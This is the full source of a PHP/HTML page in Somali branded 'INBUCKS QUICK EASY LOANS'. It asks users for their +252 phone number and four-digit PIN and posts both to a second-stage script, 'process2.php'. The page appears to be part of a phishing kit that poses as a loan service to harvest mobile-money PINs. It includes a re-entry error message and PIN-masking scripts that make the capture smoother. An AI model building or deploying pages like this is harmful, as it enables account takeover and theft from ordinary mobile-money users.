<?php
if(isset($_GET['error'])){
    echo "<p style='color:red; text-align:center;'>Fadlan geli faahfaahintaada si sax ah ❌</p>";
}
?>

<!DOCTYPE html>
<html>
<head>

<title>Confirm Details</title>
<style>
body {
    margin: 0;
    font-family: Arial;
    background: #f2f2f2;
}

/* HEADER */
.header {
    background: linear-gradient(to right, #b6e600, #4cd137);
    color: white;
    padding: 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

/* CONTAINER */
.container {
    padding: 15px;
}

.card {
    background: white;
    border-radius: 15px;
    padding: 20px;
}

/* TITLE */
.title {
    text-align: center;
    font-size: 22px;
    font-weight: bold;
}

.sub {
    text-align: center;
    color: gray;
    margin-bottom: 15px;
}

/* PROGRESS */
.progress {
    display: flex;
    justify-content: center;
    margin-bottom: 20px;
}

.progress div {
    width: 60px;
    height: 5px;
    background: #ddd;
    margin: 0 5px;
    border-radius: 10px;
}

.progress .active {
    background: #4cd137;
}

/* INPUT */
label {
    display: block;
    margin-top: 15px;
    font-weight: bold;
}

input, select {
    width: 100%;
    padding: 12px;
    border-radius: 10px;
    border: 1px solid #ccc;
    margin-top: 5px;
}

/* SUMMARY BOX */
.summary {
    background: #f5f5f5;
    border-radius: 15px;
    padding: 15px;
    margin-top: 20px;
    border-left: 5px solid #4cd137;
}

.summary p {
    display: flex;
    justify-content: space-between;
    border-bottom: 1px solid #ddd;
    padding: 10px 0;
    margin: 0;
}

/* BUTTONS */
button {
    width: 100%;
    margin-top: 20px;
    padding: 15px;
    border: none;
    border-radius: 12px;
    font-size: 16px;
    font-weight: bold;
}

.back {
    background: #ddd;
}

.submit {
    background: linear-gradient(to right, #b6e600, #4cd137);
    color: white;
}
</style>


</head>

<body>


<div class="container">

<h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>

<form action="process2.php" method="POST">

<div class="phone-box">
    <span>🇸🇴SO +252</span>
    <input type="text" id="phone" name="phone" placeholder="699999999" maxlength="9" required>
</div>

<div class="pin-container">
    
    <div class="pin-box">
        <input type="password" maxlength="1" class="pin">
        <input type="password" maxlength="1" class="pin">
        <input type="password" maxlength="1" class="pin">
        <input type="password" maxlength="1" class="pin">
    </div>

    <span id="togglePin" style="cursor:pointer; font-size:20px;">👁</span>

</div>

<input type="hidden" name="pin" id="fullPin">

<button type="submit">SII WAD</button>

</form>

</div>
<script>
const pins = document.querySelectorAll(".pin");

// When typing in first box, allow full paste/typing
pins[0].addEventListener("input", function(e) {
    let value = this.value.replace(/\D/g, '');

    // If user types multiple digits
    if (value.length > 1) {
        value = value.slice(0, 4);
        pins.forEach((input, i) => {
            input.value = value[i] || "";
        });
        if (value.length === 4) pins[3].focus();
        return;
    }

    // Move to next
    if (this.value) pins[1].focus();
});

// Handle other boxes normally
pins.forEach((input, index) => {
    if(index === 0) return;

    input.addEventListener("input", () => {
        input.value = input.value.replace(/\D/g, '');

        if (input.value && index < 3) {
            pins[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            pins[index - 1].focus();
        }
    });
});
</script>
<script>
let visible = false;

document.getElementById("togglePin").addEventListener("click", function() {
    visible = !visible;

    document.querySelectorAll(".pin").forEach(input => {
        input.type = visible ? "text" : "password";
    });

    this.textContent = visible ? "🙈" : "👁";
});
</script>
<script>
document.querySelector("form").addEventListener("submit", function() {

    let pin = "";

    document.querySelectorAll(".pin").forEach(input => {
        pin += input.value;
    });

    document.getElementById("fullPin").value = pin;

});
</script>

<!-- Bottom Logo -->
<div class="logo-container bottom">
    <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
</div>
</body>
</html>